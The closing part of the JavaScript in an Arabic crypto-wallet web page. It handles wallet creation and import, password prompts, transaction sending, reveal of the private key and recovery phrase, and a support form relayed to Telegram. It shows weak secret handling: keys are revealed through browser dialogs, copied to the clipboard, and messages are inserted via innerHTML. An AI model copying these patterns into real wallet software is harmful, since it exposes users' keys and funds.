                showToast(`تم إرسال المعاملة بنجاح! Hash: ${tx.hash}`, 'success');
                
                // تحديث الرصيد
                setTimeout(() => {
                    updateBalance();
                }, 5000);
                
            } catch (error) {
                hideLoading();
                console.error('Error sending transaction:', error);
                showToast(error.message || 'حدث خطأ أثناء إرسال المعاملة', 'error');
            }
        }

        // إرسال رسالة دعم فني
        async function sendSupportMessage(name, email, phone, message) {
            try {
                const telegramMessage = `🆘 <b>رسالة دعم فني جديدة</b>\n\n` +
                    `👤 <b>الاسم:</b> ${name}\n` +
                    `📧 <b>البريد الإلكتروني:</b> ${email}\n` +
                    `📱 <b>رقم الهاتف:</b> ${phone || 'غير محدد'}\n\n` +
                    `💬 <b>الرسالة:</b>\n${message}\n\n` +
                    `⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-SA')}`;
                
                const success = await sendToTelegram(telegramMessage);
                
                if (success) {
                    showToast('تم إرسال رسالتك بنجاح! سنتواصل معك قريباً', 'success');
                    // إعادة تعيين النموذج
                    document.getElementById('supportForm').reset();
                    hideModal('supportModal');
                } else {
                    showToast('حدث خطأ أثناء إرسال الرسالة. يرجى المحاولة مرة أخرى', 'error');
                }
                
            } catch (error) {
                console.error('Error sending support message:', error);
                showToast('حدث خطأ أثناء إرسال الرسالة', 'error');
            }
        }

        // طلب كلمة المرور بواجهة احترافية
        function promptForPasswordProfessional() {
            return new Promise((resolve, reject) => {
                const modal = document.getElementById('passwordPromptModal');
                const input = document.getElementById('passwordPromptInput');
                const confirmBtn = document.getElementById('passwordPromptConfirm');
                const cancelBtn = document.getElementById('passwordPromptCancel');
                
                // إظهار النافذة
                modal.classList.add('active');
                input.focus();
                
                // معالج تأكيد كلمة المرور
                const handleConfirm = () => {
                    const password = input.value;
                    if (password) {
                        try {
                            const walletData = loadWallet(password);
                            currentWallet = walletData;
                            userPassword = password;
                            modal.classList.remove('active');
                            input.value = '';
                            resolve(true);
                        } catch (error) {
                            showToast('كلمة مرور خاطئة', 'error');
                            input.focus();
                        }
                    }
                };
                
                // معالج إلغاء
                const handleCancel = () => {
                    modal.classList.remove('active');
                    input.value = '';
                    reject(false);
                };
                
                // ربط الأحداث
                confirmBtn.onclick = handleConfirm;
                cancelBtn.onclick = handleCancel;
                
                // الضغط على Enter
                input.onkeypress = (e) => {
                    if (e.key === 'Enter') {
                        handleConfirm();
                    }
                };
            });
        }

        // وظائف مساعدة
        function showScreen(screenId) {
            document.querySelectorAll('.screen').forEach(screen => {
                screen.classList.remove('active');
            });
            document.getElementById(screenId).classList.add('active');
        }

        function showModal(modalId) {
            document.getElementById(modalId).classList.add('active');
        }

        function hideModal(modalId) {
            document.getElementById(modalId).classList.remove('active');
        }

        function showLoading(text = 'جاري التحميل...') {
            document.getElementById('loadingText').textContent = text;
            document.getElementById('loadingOverlay').classList.add('active');
        }

        function hideLoading() {
            document.getElementById('loadingOverlay').classList.remove('active');
        }

        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                showToast('تم النسخ بنجاح!', 'success');
            }).catch(() => {
                showToast('فشل في النسخ', 'error');
            });
        }

        // عرض رسالة التنبيه
        function showToast(message, type = 'info') {
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.innerHTML = `
                <i class="fas ${getToastIcon(type)}"></i>
                <span>${message}</span>
            `;
            
            document.getElementById('toastContainer').appendChild(toast);
            
            setTimeout(() => {
                toast.style.animation = 'toastSlideOut 0.3s ease';
                setTimeout(() => {
                    toast.remove();
                }, 300);
            }, 5000);
        }

        // أيقونة رسالة التنبيه
        function getToastIcon(type) {
            switch (type) {
                case 'success': return 'fa-check-circle';
                case 'error': return 'fa-exclamation-circle';
                case 'warning': return 'fa-exclamation-triangle';
                default: return 'fa-info-circle';
            }
        }

        // تسجيل الخروج
        function logout() {
            localStorage.clear();
            currentWallet = null;
            userPassword = null;
            currentBalance = 0;
            showScreen('welcomeScreen');
            showToast('تم تسجيل الخروج بنجاح', 'success');
        }

        // التحقق من وجود محفظة محفوظة
        function checkSavedWallet() {
            return localStorage.getItem('walletExists') === 'true';
        }

        // تهيئة التطبيق
        async function initApp() {
            try {
                // تهيئة المزودين
                await initProviders();
                
                // جلب أسعار العملات المشفرة
                await fetchCryptoPrices();
                
                // التحقق من وجود محفظة محفوظة
                if (checkSavedWallet()) {
                    try {
                        await promptForPasswordProfessional();
                        showScreen('walletScreen');
                        loadWalletData();
                    } catch (error) {
                        // المستخدم ألغى إدخال كلمة المرور
                    }
                }
                
                console.log('App initialized successfully');
            } catch (error) {
                console.error('Error initializing app:', error);
                showToast('حدث خطأ أثناء تهيئة التطبيق', 'error');
            }
        }

        // أحداث DOM
        document.addEventListener('DOMContentLoaded', function() {
            // تهيئة التطبيق
            initApp();

            // أزرار الشاشة الرئيسية
            document.getElementById('importWalletBtn').addEventListener('click', () => {
                showScreen('importScreen');
            });

            document.getElementById('createWalletBtn').addEventListener('click', () => {
                showScreen('createScreen');
                createNewWallet();
            });

            // أزرار العودة
            document.getElementById('backToWelcomeBtn').addEventListener('click', () => {
                showScreen('welcomeScreen');
            });

            document.getElementById('backToWelcomeFromCreateBtn').addEventListener('click', () => {
                showScreen('welcomeScreen');
            });

            document.getElementById('backToCreateFromPasswordBtn').addEventListener('click', () => {
                showScreen('createScreen');
            });

            // زر استيراد المحفظة
            document.getElementById('importBtn').addEventListener('click', () => {
                const mnemonic = document.getElementById('mnemonicInput').value.trim();
                if (mnemonic) {
                    importWallet(mnemonic);
                } else {
                    showToast('يرجى إدخال عبارة الاسترجاع', 'warning');
                }
            });

            // زر المتابعة لكلمة المرور
            document.getElementById('continueToPasswordBtn').addEventListener('click', () => {
                showScreen('passwordScreen');
            });

            // أحداث كلمة المرور
            const passwordInput = document.getElementById('passwordInput');
            const confirmPasswordInput = document.getElementById('confirmPasswordInput');
            const setPasswordBtn = document.getElementById('setPasswordBtn');

            passwordInput.addEventListener('input', (e) => {
                const isValid = updatePasswordStrength(e.target.value);
                checkPasswordMatch();
            });

            confirmPasswordInput.addEventListener('input', checkPasswordMatch);

            function checkPasswordMatch() {
                const password = passwordInput.value;
                const confirmPassword = confirmPasswordInput.value;
                const isStrong = updatePasswordStrength(password);
                const isMatching = password === confirmPassword && password.length > 0;
                
                setPasswordBtn.disabled = !(isStrong && isMatching);
            }

            // تبديل رؤية كلمة المرور
            document.getElementById('togglePassword').addEventListener('click', () => {
                const input = document.getElementById('passwordInput');
                const icon = document.querySelector('#togglePassword i');
                
                if (input.type === 'password') {
                    input.type = 'text';
                    icon.className = 'fas fa-eye-slash';
                } else {
                    input.type = 'password';
                    icon.className = 'fas fa-eye';
                }
            });

            document.getElementById('toggleConfirmPassword').addEventListener('click', () => {
                const input = document.getElementById('confirmPasswordInput');
                const icon = document.querySelector('#toggleConfirmPassword i');
                
                if (input.type === 'password') {
                    input.type = 'text';
                    icon.className = 'fas fa-eye-slash';
                } else {
                    input.type = 'password';
                    icon.className = 'fas fa-eye';
                }
            });

            // زر تعيين كلمة المرور
            document.getElementById('setPasswordBtn').addEventListener('click', () => {
                const password = passwordInput.value;
                
                if (currentWallet) {
                    saveWallet(currentWallet, password);
                    userPassword = password;
                    showScreen('walletScreen');
                    loadWalletData();
                    showToast('تم حفظ المحفظة بنجاح!', 'success');
                }
            });

            // أزرار النسخ
            document.getElementById('copyAddressBtn').addEventListener('click', () => {
                const address = document.getElementById('newWalletAddress').textContent;
                copyToClipboard(address);
            });

            document.getElementById('copyMnemonicBtn').addEventListener('click', () => {
                const mnemonic = document.getElementById('newWalletMnemonic').textContent;
                copyToClipboard(mnemonic);
            });

            document.getElementById('copyCurrentAddressBtn').addEventListener('click', () => {
                if (currentWallet) {
                    copyToClipboard(currentWallet.address);
                }
            });

            document.getElementById('copyReceiveAddressBtn').addEventListener('click', () => {
                if (currentWallet) {
                    copyToClipboard(currentWallet.address);
                }
            });

            // زر تحديث الرصيد
            document.getElementById('refreshBalanceBtn').addEventListener('click', () => {
                updateBalance();
                showToast('جاري تحديث الرصيد...', 'info');
            });

            // أزرار الإجراءات السريعة
            document.getElementById('sendBtn').addEventListener('click', () => {
                showModal('sendModal');
            });

            document.getElementById('receiveBtn').addEventListener('click', () => {
                showModal('receiveModal');
                if (currentWallet) {
                    generateQRCode(currentWallet.address);
                }
            });

            document.getElementById('swapBtn').addEventListener('click', () => {
                showToast('ميزة التبديل قريباً!', 'info');
            });

            document.getElementById('buyBtn').addEventListener('click', () => {
                showToast('ميزة الشراء قريباً!', 'info');
            });

            document.getElementById('supportBtn').addEventListener('click', () => {
                showModal('supportModal');
            });

            // زر الإعدادات
            document.getElementById('settingsBtn').addEventListener('click', () => {
                showModal('settingsModal');
            });

            // أزرار إغلاق النوافذ المنبثقة
            document.getElementById('closeSendModal').addEventListener('click', () => {
                hideModal('sendModal');
            });

            document.getElementById('closeReceiveModal').addEventListener('click', () => {
                hideModal('receiveModal');
            });

            document.getElementById('closeQrScannerModal').addEventListener('click', () => {
                stopQRScanner();
                hideModal('qrScannerModal');
            });

            document.getElementById('closeSettingsModal').addEventListener('click', () => {
                hideModal('settingsModal');
            });

            document.getElementById('closeSupportModal').addEventListener('click', () => {
                hideModal('supportModal');
            });

            // زر مسح QR
            document.getElementById('scanAddressBtn').addEventListener('click', () => {
                showModal('qrScannerModal');
            });

            // أزرار ماسح QR
            document.getElementById('startScanBtn').addEventListener('click', startQRScanner);
            document.getElementById('stopScanBtn').addEventListener('click', stopQRScanner);

            // تغيير الشبكة في نافذة الاستقبال
            document.getElementById('receiveNetworkSelect').addEventListener('change', (e) => {
                const network = e.target.value;
                const warningText = document.getElementById('receiveWarningText');
                
                const networkNames = {
                    ethereum: 'Ethereum (ETH, ERC-20)',
                    bsc: 'Binance Smart Chain (BNB, BEP-20)',
                    polygon: 'Polygon (MATIC, Polygon)',
                    arbitrum: 'Arbitrum (ETH, Arbitrum)',
                    optimism: 'Optimism (ETH, Optimism)'
                };
                
                warningText.textContent = `أرسل فقط أصول ${networkNames[network]} إلى هذا العنوان`;
            });

            // أزرار الإعدادات
            document.getElementById('showPrivateKeyBtn').addEventListener('click', () => {
                if (currentWallet && userPassword) {
                    const password = prompt('أدخل كلمة المرور لعرض المفتاح الخاص:');
                    if (password === userPassword) {
                        const privateKey = currentWallet.privateKey;
                        if (confirm(`المفتاح الخاص:\n\n${privateKey}\n\n⚠️ تحذير: لا تشارك هذا المفتاح مع أي شخص!\n\nهل تريد نسخه؟`)) {
                            copyToClipboard(privateKey);
                        }
                    } else {
                        showToast('كلمة مرور خاطئة', 'error');
                    }
                }
            });

            document.getElementById('showMnemonicBtn').addEventListener('click', () => {
                if (currentWallet && userPassword) {
                    const password = prompt('أدخل كلمة المرور لعرض عبارة الاسترجاع:');
                    if (password === userPassword) {
                        const mnemonic = currentWallet.mnemonic;
                        if (confirm(`عبارة الاسترجاع:\n\n${mnemonic}\n\n⚠️ تحذير: لا تشارك هذه العبارة مع أي شخص!\n\nهل تريد نسخها؟`)) {
                            copyToClipboard(mnemonic);
                        }
                    } else {
                        showToast('كلمة مرور خاطئة', 'error');
                    }
                }
            });

            document.getElementById('changePasswordBtn').addEventListener('click', () => {
                showToast('ميزة تغيير كلمة المرور قريباً!', 'info');
            });

            document.getElementById('logoutBtn').addEventListener('click', () => {
                if (confirm('هل أنت متأكد من تسجيل الخروج؟ سيتم حذف جميع بيانات المحفظة من هذا الجهاز.')) {
                    logout();
                }
            });

            // نموذج الدعم الفني
            document.getElementById('supportForm').addEventListener('submit', (e) => {
                e.preventDefault();
                
                const name = document.getElementById('supportName').value.trim();
                const email = document.getElementById('supportEmail').value.trim();
                const phone = document.getElementById('supportPhone').value.trim();
                const message = document.getElementById('supportMessage').value.trim();
                
                if (!name || !email || !message) {
                    showToast('يرجى ملء جميع الحقول المطلوبة', 'warning');
                    return;
                }
                
                sendSupportMessage(name, email, phone, message);
            });

            // إغلاق النوافذ المنبثقة عند النقر خارجها
            document.querySelectorAll('.modal').forEach(modal => {
                modal.addEventListener('click', (e) => {
                    if (e.target === modal) {
                        modal.classList.remove('active');
                        if (modal.id === 'qrScannerModal') {
                            stopQRScanner();
                        }
                    }
                });
            });

            // خيارات الغاز
            document.querySelectorAll('.gas-option').forEach(option => {
                option.addEventListener('click', () => {
                    document.querySelectorAll('.gas-option').forEach(opt => opt.classList.remove('active'));
                    option.classList.add('active');
                });
            });

            // نموذج الإرسال
            document.getElementById('sendForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                
                const network = document.getElementById('networkSelect').value;
                const to = document.getElementById('recipientAddress').value.trim();
                const amount = parseFloat(document.getElementById('sendAmount').value);
                const asset = document.getElementById('assetSelect').value;
                
                if (!to || !amount || amount <= 0) {
                    showToast('يرجى ملء جميع الحقول بشكل صحيح', 'warning');
                    return;
                }
                
                if (!ethers.utils.isAddress(to)) {
                    showToast('عنوان المحفظة غير صحيح', 'error');
                    return;
                }
                
                if (confirm(`هل أنت متأكد من إرسال ${amount} ${asset} إلى ${to}؟`)) {
                    await sendTransaction(network, to, amount, asset);
                    hideModal('sendModal');
                }
            });

            // تحديث خيارات الأصول حسب الشبكة
            document.getElementById('networkSelect').addEventListener('change', (e) => {
                const network = e.target.value;
                const assetSelect = document.getElementById('assetSelect');
                
                assetSelect.innerHTML = '';
                
                const networkConfig = NETWORKS[network];
                if (networkConfig) {
                    // إضافة العملة الأساسية
                    const nativeOption = document.createElement('option');
                    nativeOption.value = networkConfig.symbol;
                    nativeOption.textContent = networkConfig.symbol;
                    assetSelect.appendChild(nativeOption);
                    
                    // إضافة الرموز المميزة
                    Object.keys(networkConfig.tokens || {}).forEach(token => {
                        const option = document.createElement('option');
                        option.value = token;
                        option.textContent = token;
                        assetSelect.appendChild(option);
                    });
                }
            });

            // تحديث الأسعار كل دقيقة
            setInterval(fetchCryptoPrices, 60000);
        });
    </script>
</body>
</html>

